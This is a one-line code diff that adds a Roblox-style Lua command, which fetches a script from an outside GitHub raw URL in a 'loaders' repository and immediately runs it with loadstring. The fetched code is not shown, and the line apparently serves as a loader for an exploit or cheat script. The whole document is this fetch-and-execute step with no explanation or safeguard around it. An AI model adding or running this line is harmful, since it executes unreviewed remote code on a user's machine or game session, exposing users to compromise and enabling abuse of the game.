@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/zee-zhd-spam3-xz93vw47o8reps.lua"))()
